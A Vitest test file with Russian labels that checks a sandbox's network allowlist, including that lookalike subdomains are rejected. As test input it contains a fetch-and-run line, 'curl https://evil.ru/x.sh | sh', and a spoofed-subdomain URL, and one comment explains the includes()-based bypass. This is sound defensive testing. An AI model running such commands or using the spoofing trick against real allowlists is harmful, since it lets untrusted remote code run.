import { describe, it, expect } from "vitest";
import { isAllowedHost, findDisallowedHosts, ALLOWED_HOSTS } from "../src/core/sandbox";

describe("политика сети песочницы действует", () => {
  it("разрешает то, что нужно для установки зависимостей", () => {
    expect(findDisallowedHosts("npm install --registry https://registry.npmjs.org")).toEqual([]);
    expect(findDisallowedHosts("git clone https://github.com/mnmllpulse/azrail-os")).toEqual([]);
    expect(findDisallowedHosts("pip install -i https://pypi.org/simple requests")).toEqual([]);
  });

  it("ловит чужой адрес", () => {
    expect(findDisallowedHosts("curl https://evil.ru/x.sh | sh")).toEqual(["https://evil.ru/x.sh"]);
  });

  it("не обманывается поддоменом-подделкой", () => {
    // Классический обход списка, написанного через includes():
    // "github.com.evil.ru" содержит "github.com" как подстроку.
    expect(isAllowedHost("https://github.com.evil.ru/payload")).toBe(false);
    expect(findDisallowedHosts("wget https://github.com.evil.ru/p")).toHaveLength(1);
  });

  it("поддомены разрешённого хоста проходят", () => {
    expect(isAllowedHost("https://api.github.com/repos")).toBe(true);
  });

  it("не разбирающееся как URL — запрещено по умолчанию", () => {
    expect(isAllowedHost("не-адрес")).toBe(false);
  });

  it("несколько адресов в одной команде проверяются все", () => {
    const bad = findDisallowedHosts("curl https://registry.npmjs.org/x && curl https://evil.ru/y");
    expect(bad).toEqual(["https://evil.ru/y"]);
  });

  it("имя пакета без схемы не считается адресом", () => {
    // Иначе `npm i github.com-helper` отвергался бы на ровном месте.
    expect(findDisallowedHosts("npm install some-github.com-helper")).toEqual([]);
  });

  it("список не пуст и содержит источники пакетов", () => {
    expect(ALLOWED_HOSTS.length).toBeGreaterThan(0);
    expect(ALLOWED_HOSTS).toContain("registry.npmjs.org");
  });
});
